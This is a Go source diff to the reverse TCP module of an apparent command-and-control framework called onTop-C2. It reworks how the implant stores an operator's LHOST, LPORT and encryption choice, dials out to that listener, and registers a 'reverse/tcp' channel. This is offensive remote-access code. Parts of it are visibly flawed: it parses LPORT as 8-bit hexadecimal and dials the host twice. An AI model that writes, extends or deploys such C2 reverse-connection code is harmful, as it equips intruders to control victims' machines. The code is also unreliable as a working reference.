@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"strconv"
 	"time"
 
 	// "github.com/Yyax13/onTop-C2/src/misc"
@@ -25,7 +26,12 @@ type reverse_tcpFloo struct{
 
 }
 
-type reverse_tcpInit struct{}
+type reverse_tcpInit struct{
+	lhost		string
+	lport		int
+	fidelius	types.FideliusCasting
+
+}
 
 func (r *reverse_tcpFloo) Send(data []byte) (error) {
 	dataLen := uint32(len(data))
@@ -78,14 +84,17 @@ func (r *reverse_tcpFloo) IsActive() (bool) {
 
 }
 
-func (t reverse_tcpInit) InitArcane(host, target string, f types.Fidelius) (*types.ArcaneLink, error) {
-	_, tryToReach := net.Dial("tcp", host)
+func (t reverse_tcpInit) InitArcane() (*types.ArcaneLink, error) {
+	host := t.lhost
+	port := t.lport
+	connString := net.JoinHostPort(host, strconv.Itoa(port))
+	_, tryToReach := net.Dial("tcp", connString)
 	if tryToReach != nil {
 		return &types.ArcaneLink{}, fmt.Errorf("can't reach host %s, check it and try again", host)
 	
 	}
 
-	connection, err := net.Dial("tcp", host)
+	connection, err := net.Dial("tcp", connString)
 	if err != nil {
 		return &types.ArcaneLink{}, err
 
@@ -96,14 +105,40 @@ func (t reverse_tcpInit) InitArcane(host, target string, f types.Fidelius) (*typ
 			conn: connection, 
 		
 		},
-		ClientScrool: &types.Scroll{},
-		Fidelius: f,
+		ClientScroll: &types.Scroll{},
+		Fidelius: t.fidelius,
 		
 	}, nil
 
 }
 
+func reverse_tcpCreator() (RitualCreator) {
+	return func(params map[string]string) (types.RitualInit, error) {
+		port, err := strconv.ParseInt(params["LPORT"], 16, 8)
+		if err != nil {
+			return nil, fmt.Errorf("failed to use LPORT param as ritual lport: %w", err)
+
+		}
+
+		fideliusCast, exists := fidelius.AvaliableFidelius[params["FIDELIUS"]]
+		if !exists {
+			return nil, fmt.Errorf("specified fidelius %s do not exists", params["FIDELIUS"])
+
+		}
+
+		return reverse_tcpInit{
+			lhost: params["LHOST"],
+			lport: int(port),
+			fidelius: fideliusCast.Fidelius,
+			
+		}, nil
+
+	}
+
+}
+
 func init() {
 	RegisterNewRitual(&reverse_tcp)
+	RegisterNewRitualCreator("reverse/tcp", reverse_tcpCreator())
 
 }
